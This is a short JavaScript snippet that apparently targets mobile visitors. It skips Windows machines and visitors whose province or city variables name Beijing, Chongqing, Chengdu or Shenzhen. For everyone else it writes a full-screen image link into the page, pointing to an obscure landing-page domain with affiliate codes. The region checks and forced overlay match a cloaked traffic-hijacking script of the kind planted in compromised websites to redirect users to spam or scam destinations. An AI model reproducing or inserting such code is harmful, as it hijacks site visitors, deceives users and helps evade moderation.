var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;
var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
var azs = navigator.userAgent.match(/Android|Linux/i) != null;
if(wap){
    (function() {
        if (/Win/i.test(navigator.platform)) return false;
        if(shengfen=="北京" || shengfen=="重庆" || chengshi=="成都" || chengshi=="深圳"){
            return false;
        }else{
            //img数组
            var img_arr = new Array(
            	'https://p6-tt-ipv6.byteimg.com/origin/pgc-image/fb0cf402156d47f1a52229fc0ce7d5de',
            	'https://p3.toutiaoimg.com/origin/pgc-image/f127ea2882e941d2b2b45a730e8ebfaa'
            );
            //var luodiye = 'https://blzb29.com/?channelCode=ys10';
            var luodiye = 'https://www.enmwns.com/?android=hjc58&type=7&ios=hjc58&all=&style=1';
            var urlv = Math.floor((Math.random()*img_arr.length)); 
            var urla = img_arr[urlv];
            document.writeln('<a href="'+luodiye+'" target="_blank"><img src="'+urla+'" width="100%" height="100%"></a>');
        }
    })();
}